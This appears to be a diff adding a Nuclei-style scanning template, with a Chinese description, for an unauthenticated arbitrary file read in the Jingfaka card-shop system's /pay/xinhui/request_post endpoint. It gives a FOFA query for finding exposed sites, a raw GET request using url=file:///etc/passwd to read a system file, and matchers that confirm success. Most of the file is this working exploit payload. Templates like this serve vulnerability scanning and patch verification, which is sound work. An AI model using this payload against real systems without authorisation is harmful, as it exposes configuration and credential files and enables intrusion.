@@ -1,0 +1,35 @@
+id: jingfaka-pay_xinhui_request_post-File-reading
+
+info:
+  name: "鲸发卡系统 request_post 接口任意文件读取漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/static/theme/maowang51/css/style.css"
+      鲸发卡系统 /pay/xinhui/request_post 接口未正确实施访问控制，导致攻击者可构造特定请求读取任意文件。该漏洞允许未经身份验证的攻击者获取敏感信息，包括数据库配置文件、系统配置文件等，从而可能导致系统被入侵，造成数据泄露或服务中断。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140432009
+  tags: 鲸发卡系统
+
+
+
+http:
+- raw:
+  - |
+    GET /pay/xinhui/request_post?url=file:///etc/passwd&post_data[1]= HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'root:'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
